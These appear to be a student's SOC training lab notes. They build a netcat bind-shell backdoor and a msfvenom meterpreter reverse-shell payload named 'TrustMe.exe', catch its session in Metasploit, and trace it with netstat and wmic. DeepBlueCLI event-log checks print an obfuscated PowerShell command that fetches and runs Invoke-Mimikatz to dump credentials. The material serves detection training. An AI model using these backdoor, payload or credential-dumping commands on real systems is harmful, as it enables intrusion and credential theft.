@@ -1,0 +1,286 @@
+Day 26 Labs of SOC Core skills.  I will post my labs from day 27 tomorrow.
+
+=================================================================================================
+LAB 1: Linux CLI
+
+In this lab we will be looking at a backdoor through the lense of the Linux CLI.
+
+Get into sudo
+$ sudo su 
+
+create a fifo backpipe:
+# mknod backpipe p
+
+Start the backdoor while creating a netcat listener that forwards all input through a backpipe and then into bash.  It will take the output of the bash session and put it back into the netcat listener. This executes NC without -e (not supported in this environment).
+# /bin/bash 0<backpipe | nc -l 2222 1>backpipe
+
+I will open up a new window and get the IP : 172.21.60.33
+$ ip addr show
+
+Now set up the NC connection on port 2222.
+	$ nc 172.30.249.49 2222
+
+Now I will bring up a third window and go sudo than look at network connections with lsof(showing the port number).
+	# lsof -i -P
+COMMAND PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
+nc      590 root    3u  IPv4  65864      0t0  TCP *:2222 (LISTEN)
+
+I will now use lsof (with a -p) to show all of the open files associated with the listed process ID.
+	 lsof -p 590
+COMMAND PID USER   FD   TYPE DEVICE SIZE/OFF   NODE NAME
+nc      590 root  cwd    DIR   8,48     4096  49153 /root
+nc      590 root  rtd    DIR   8,48     4096      2 /
+nc      590 root  txt    REG   8,48    35312  36505 /bin/nc.openbsd
+nc      590 root  mem    REG   8,48   144976  34138 /lib/x86_64-linux-gnu/libpthread-2.27.so
+nc      590 root  mem    REG   8,48    31680  34146 /lib/x86_64-linux-gnu/librt-2.27.so
+nc      590 root  mem    REG   8,48  2030544  34018 /lib/x86_64-linux-gnu/libc-2.27.so
+nc      590 root  mem    REG   8,48   101168  34144 /lib/x86_64-linux-gnu/libresolv-2.27.so
+nc      590 root  mem    REG   8,48    80104  34014 /lib/x86_64-linux-gnu/libbsd.so.0.8.7
+nc      590 root  mem    REG   8,48   170960  33995 /lib/x86_64-linux-gnu/ld-2.27.so
+nc      590 root    0r  FIFO   0,11      0t0  65045 pipe
+nc      590 root    1w  FIFO   8,48      0t0 134288 /root/backpipe
+nc      590 root    2u   CHR  136,2      0t0      5 /dev/pts/2
+nc      590 root    3u  IPv4  65864      0t0    TCP *:2222 (LISTEN)
+
+I will now go into the directory of the process and look at the files.
+	cd /proc/590
+root@DESKTOP-I1T2G01:/proc/590# ls
+attr        coredump_filter  fdinfo     mem         oom_adj        root          stack    timers
+auxv        cpuset           gid_map    mountinfo   oom_score      sched         stat     timerslack_ns
+cgroup      cwd              io         mounts      oom_score_adj  schedstat     statm    uid_map
+clear_refs  environ          limits     mountstats  pagemap        setgroups     status   wchan
+cmdline     exe              map_files  net         personality    smaps         syscall
+comm        fd               maps       ns          projid_map     smaps_rollup  task
+
+In an attempt to find out that the program is doing, I will run strings on the executable.
+
+	# strings ./exe
+
+Scrolling down we see (from pulling the memory) usage information for netcat.
+
+	usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
+          [-m minttl] [-O length] [-P proxy_username] [-p source_port]
+          [-q seconds] [-s source] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout]
+          [-X proxy_protocol] [-x proxy_address[:port]]           [destination] [port]
+        	Command Summary:
+                -4              Use IPv4
+                -6              Use IPv6
+                -b              Allow broadcast
+                -C              Send CRLF as line-ending
+                -D              Enable the debug socket option
+                -d              Detach from stdin
+                -F              Pass socket fd
+                -h              This help text
+                -I length       TCP receive buffer length
+                -i interval     Delay interval for lines sent, ports scanned
+                -k              Keep inbound sockets open for multiple connects
+                -l              Listen mode, for inbound connects
+                -M ttl          Outgoing TTL / Hop Limit
+                -m minttl       Minimum incoming TTL / Hop Limit
+                -N              Shutdown the network socket after EOF on stdin
+                -n              Suppress name/port resolutions
+                -O length       TCP send buffer length
+                -P proxyuser    Username for proxy authentication
+                -p port         Specify local port for remote connects
+                -q secs         quit after EOF on stdin and delay of secs
+                -r              Randomize remote ports
+                -S              Enable the TCP MD5 signature option
+                -s source       Local source address
+                -T keyword      TOS value
+                -t              Answer TELNET negotiation
+                -U              Use UNIX domain socket
+                -u              UDP mode
+                -V rtable       Specify alternate routing table
+                -v              Verbose
+                -W recvlimit    Terminate after receiving a number of packets
+                -w timeout      Timeout for connects and final net reads
+                -X proto        Proxy protocol: "4", "5" (SOCKS) or "connect"
+                -x addr[:port]  Specify proxy address and port
+                -Z              DCCP mode
+                -z              Zero-I/O mode [used for scanning]
+
+
+
+========================================================================
+LAB: 2
+
+In this lab we will create some malware, run it and then use the tools we went through in the slides to look at what an attack looks like on a live system. 
+
+First I will get my IP.
+
+	$ ip addr show
+    	inet 172.21.60.33/20
+
+	$ sudo su
+# msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=172.21.60.33 lport=4444 -f exe -o /tmp/TrustMe.exe
+
+I will now create a backdoor & listener.
+d# msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=172.21.60.33 lport=4444 -f exe -o /tmp/TrustMe.exe
+# msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=172.21.60.33 lport=4444 -f exe -o /tmp/TrustMe.exe
+No encoder specified, outputting raw payload
+Payload size: 341 bytes
+Final size of exe file: 73802 bytes
+Saved as: /tmp/TrustMe.exe
+d# cd /tmp
+ls -l TrustMe.exe
+-rw-r--r-- 1 root root 73802 Feb  2 19:54 TrustMe.exe
+# python -m SimpleHTTPServer 8000 &
+[1] 706
+# Serving HTTP on 0.0.0.0 port 8000 ...
+
+Now I will run the metasploit exploit.
+	# msfconsole -q
+msf5 > use exploit/multi/handler
+msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > set LHOST 172.26.19.133
+msf5 exploit(multi/handler) > exploit
+
+I will now go to the directory in my browser and download TrustMe.exe.
+
+172.21.60.33:8000
+
+	[*] Started reverse TCP handler on 172.21.60.33:4444
+[*] Sending stage (176195 bytes) to 172.21.48.1
+[*] Meterpreter session 1 opened (172.21.60.33:4444 -> 172.21.48.1:63061) at 2021-02-02 20:06:43 -0700
+
+Now to check if it is connected (in windows CMD)
+	Netstat -naob
+
+TCP    172.21.48.1:63070      172.21.60.33:4444      ESTABLISHED     5944
+ 	[TrustMe (1).exe]
+
+First see if what DLLs are running with TrustMe
+	tasklist /m /fi "pid eq 5944
+
+Image Name                     PID Modules
+========================= ======== ============================================
+TrustMe (1).exe               5944 ntdll.dll, wow64.dll, wow64win.dll,
+              	                            Wow64cpu.dll
+
+Not that many, so I will get the command ran with wmic.
+wmic process where processid=5944 get commandline
+
+"C:\Users\adhd\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads\TrustMe (1).exe"
+
+
+I came from edge, we can verify and see if it spawned anything with wmic.
+	Name                             ParentProcessId  ProcessId
+	TrustMe (1).exe                  5292             5944
+	Browser_broker.exe             876             5292 (Trustme was created by Browser_broker)
+	Cmd.exe		        5944             6133  (Trustme ran a CMD command)
+
+
+========================================================================
+LAB: 3 - DeepBlueCLI
+	
+DeepBlueCLI is a free tool by Eric Conrad that demonstrates some amazing detection capabilities. It also has some checks that are effective for showing how UEBA style techniques can be in your environment.
+
+From CMD, we will navigate to DeepBlue and run powershell and set unrestricted execution policy.
+	C:\>cd \tools\DeepBlueCLI-master
+C:\tools\DeepBlueCLI-master>powershell
+	PS C:\tools\DeepBlueCLI-master> Set-ExecutionPolicy unrestricted
+	PS C:\tools\DeepBlueCLI-master> .\DeepBlue.ps1 .\evtx\new-user-security.evtx
+
+We will run a check for new user.
+2 were made
+		Date    : 10/23/2013 10:22:40 AM
+Log     : Security
+EventID : 4732
+Message : User added to local Administrators group
+Results : Username: -
+          		User SID: S-1-5-21-3463664321-2923530833-3546627382-1000
+
+Command :
+Decoded :
+
+Date    : 10/23/2013 10:22:39 AM
+Log     : Security
+EventID : 4720
+Message : New User Created
+Results : Username: IEUser
+          		User SID: S-1-5-21-3463664321-2923530833-3546627382-1000
+
+Time so see if there was a large number a failures per account or failures for multiple accounts:
+
+	PS C:\tools\DeepBlueCLI-master> .\DeepBlue.ps1
+.\evtx\smb-password-guessing-security.evtx
+Date    : 9/19/2016 10:50:06 AM
+Log     : Security
+EventID : 4625
+Message : High number of logon failures for one account
+Results : Username: Administrator
+          Total logon failures: 3560
+Command :
+Decoded :
+
+Date    : 9/19/2016 10:50:06 AM
+Log     : Security
+EventID : 4625
+Message : High number of total logon failures for multiple accounts
+Results : Total accounts: 2
+          Total logon failures: 3561
+
+Command :
+Decoded :
+
+
+Now I will test if there was a password spray.
+
+	Date    : 4/30/2019 1:27:40 PM
+Log     : Security
+EventID : 4648
+Message : Distributed Account Explicit Credential Use (Password Spray Attack)
+Results : The use of multiple user account access attempts with explicit credentials is an indicator of a password spray attack.
+Target Usernames: gsalinas cdavis lpesce Administrator melliott dpendolino cragoso baker	cmoody rbowes jkulikowski jleytevidal tbennett zmathis bgreenwood cspizor wstrzelec drook
+          dmashburn sanson cfleener celgee bhostetler eskoudis kperryman mtoussain thessman
+          bgalbraith ssims psmith jorchilles smisenar bking mdouglas jlake jwright econrad edygert
+          lschifano sarmstrong ebooth
+          Accessing Username: jwrig
+          Accessing Host Name: DESKTOP-JR78RLP
+
+Command :
+Decoded :
+
+
+Last one I will run will detect various encoding tactics that attackers use to obfuscate their attacks.
+
+PS C:\tools\DeepBlueCLI-master> .\DeepBlue.ps1 .	\evtx\Powershell-Invoke-Obfuscation-encoding-menu.evtx
+
+
+
+One of many results:
+
+	Decoded :
+
+Date    : 8/30/2017 1:16:06 PM
+Log     : Powershell
+EventID : 4104
+Message : Suspicious Command Line
+Results : Long Command Line: greater than 1000 bytes
+          Possible command obfuscation: only 58% alphanumeric and common symbols
+
+Command :   iex([CHar]73  +[CHar]69+[CHar]88  +[CHar]32  +[CHar]40  +[CHar]78  +[CHar]101+[CHar]119
+          +  [CHar]45+  [CHar]79  +  [CHar]98+[CHar]106+[CHar]101  +[CHar]99  +[CHar]116+  [CHar]32
+          +[CHar]78+[CHar]101  +  [CHar]116  +[CHar]46+[CHar]87+[CHar]101  +  [CHar]98+  [CHar]67
+          +[CHar]108  +[CHar]105+[CHar]101  +  [CHar]110  +  [CHar]116+  [CHar]41  +  [CHar]46+
+          [CHar]68+  [CHar]111+  [CHar]119+  [CHar]110+[CHar]108  +[CHar]111+  [CHar]97  +  [CHar]100
+           +  [CHar]83+  [CHar]116  +  [CHar]114+[CHar]105  +[CHar]110+  [CHar]103+  [CHar]40+
+          [CHar]39+[CHar]104  +[CHar]116  +[CHar]116+  [CHar]112  +[CHar]115  +  [CHar]58+
+          [CHar]47+[CHar]47+[CHar]114+  [CHar]97+  [CHar]119  +  [CHar]46+[CHar]103+[CHar]105+
+          [CHar]116  +[CHar]104  +[CHar]117+[CHar]98+[CHar]117+[CHar]115  +  [CHar]101+  [CHar]114
+          +[CHar]99+  [CHar]111  +  [CHar]110+[CHar]116  +  [CHar]101  +  [CHar]110+  [CHar]116
+          +[CHar]46+  [CHar]99  +[CHar]111  +[CHar]109  +[CHar]47  +  [CHar]109  +[CHar]97
+          +[CHar]116  +[CHar]116  +  [CHar]105  +  [CHar]102  +[CHar]101  +  [CHar]115  +
+          [CHar]116+[CHar]97+  [CHar]116+  [CHar]105+  [CHar]111  +[CHar]110  +[CHar]47+
+          [CHar]80+[CHar]111  +  [CHar]119  +[CHar]101  +  [CHar]114+  [CHar]83+
+          [CHar]112+[CHar]108+  [CHar]111+  [CHar]105  +  [CHar]116+[CHar]47  +  [CHar]109+  [CHar]97
+           +[CHar]115  +[CHar]116+[CHar]101  +[CHar]114  +[CHar]47+[CHar]69+[CHar]120  +[CHar]102+
+          [CHar]105+[CHar]108  +[CHar]116  +  [CHar]114+  [CHar]97+  [CHar]116  +  [CHar]105  +
+          [CHar]111+[CHar]110+[CHar]47+[CHar]73+  [CHar]110+[CHar]118+[CHar]111+[CHar]107
+          +[CHar]101+[CHar]45+  [CHar]77+  [CHar]105+[CHar]109+[CHar]105  +[CHar]107+[CHar]97  +
+          [CHar]116+[CHar]122  +  [CHar]46  +  [CHar]112+[CHar]115  +  [CHar]49+  [CHar]39  +
+          [CHar]41  +[CHar]59  +[CHar]32+  [CHar]73+[CHar]110+[CHar]118+  [CHar]111+
+          [CHar]107+[CHar]101+[CHar]45+  [CHar]77  +  [CHar]105  +[CHar]109+[CHar]105+  [CHar]107  +
+          [CHar]97+[CHar]116+[CHar]122+[CHar]32  +  [CHar]45  +[CHar]68+[CHar]117  +[CHar]109+
+          [CHar]112  +[CHar]67+[CHar]114  +[CHar]101+[CHar]100  +  [CHar]115)
